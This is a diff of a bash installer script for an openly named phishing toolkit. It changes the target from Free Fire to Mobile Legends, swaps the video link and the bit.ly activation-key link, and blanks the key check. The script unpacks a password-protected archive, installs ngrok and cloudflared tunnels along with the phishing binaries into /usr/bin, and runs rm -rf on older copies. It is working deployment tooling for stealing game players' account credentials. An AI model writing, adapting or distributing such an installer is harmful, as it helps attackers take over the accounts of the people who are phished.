@@ -28,7 +28,7 @@ echo ""
 echo ""
 rm -rf /usr/bin/SUMAN
 rm -rf /usr/bin/OnlineHacking
-rm -rf /usr/bin/FreeFire-Phishing
+rm -rf /usr/bin/MobileLegend-Phishing
 rm -rf /usr/bin/ngrok
 rm -rf /usr/bin/cloudflared
 sleep 5
@@ -46,7 +46,7 @@ echo ""
 echo -e ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
 echo ""
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://play.onlinehacking.xyz/v/bINNkn  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m Enter  "
 echo ""
 echo ""
 echo ""
@@ -83,14 +83,14 @@ echo ""
 echo ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Shot Link and Copy Activation Key \e[0m"
 echo ""
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://bit.ly/OHSMFF  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://bit.ly/3zKZZ8B  "
 echo ""
 echo ""
 read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Activation Key : \e[0m' option
 echo""
 echo""
 echo""
-if [[ $option == *'abcbefa8b478c48267755a4b96d45a'* ]]; then
+if [[ $option == *''* ]]; then
 clear
 echo ""
 echo ""
@@ -136,8 +136,8 @@ unrar x -Password SUMAN.rar
 rm -rf SUMAN.rar
 chmod +x ngrok
 chmod +x cloudflared-linux-386
-chmod +x FreeFire
-chmod +x FF
+chmod +x MobileLegend
+chmod +x ML
 clear
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
@@ -158,19 +158,16 @@ echo
 cp -R cloudflared-linux-386 ngrok SUMAN/1/
 cp -R cloudflared-linux-386 ngrok SUMAN/2/
 cp -R cloudflared-linux-386 ngrok SUMAN/3/
-cp -R cloudflared-linux-386 ngrok SUMAN/4/
-cp -R cloudflared-linux-386 ngrok SUMAN/5/
-cp -R cloudflared-linux-386 ngrok SUMAN/6/
-chmod 7777 FreeFire-Phishing
+chmod 7777 MobileLegend-Phishing
 clear
 echo
 echo
 cp -R ngrok /usr/bin/
 cp -R cloudflared-linux-386 /usr/bin/
 cp -R SUMAN /usr/bin/
-cp -R FreeFire /usr/bin/
-cp -R FreeFire-Phishing /usr/bin/
-cp -R FF /usr/bin/
+cp -R MobileLegend /usr/bin/
+cp -R MobileLegend-Phishing /usr/bin/
+cp -R ML /usr/bin/
 cp -R Run-Ngrok /usr/bin/
 cp -R OnlineHacking /usr/bin/
 echo
@@ -189,7 +186,7 @@ echo
 echo -e "\e[1m \e[36m[+] There Free Fire Phishing Tool Ready \e[m \e[21"
 echo
 echo
-echo -e "\e[92m[+] Open New type this command:\e[93m FreeFire-Phishing \e[m "
+echo -e "\e[92m[+] Open New type this command:\e[93m MobileLegend-Phishing \e[m "
 echo
 fi
 sleep 3
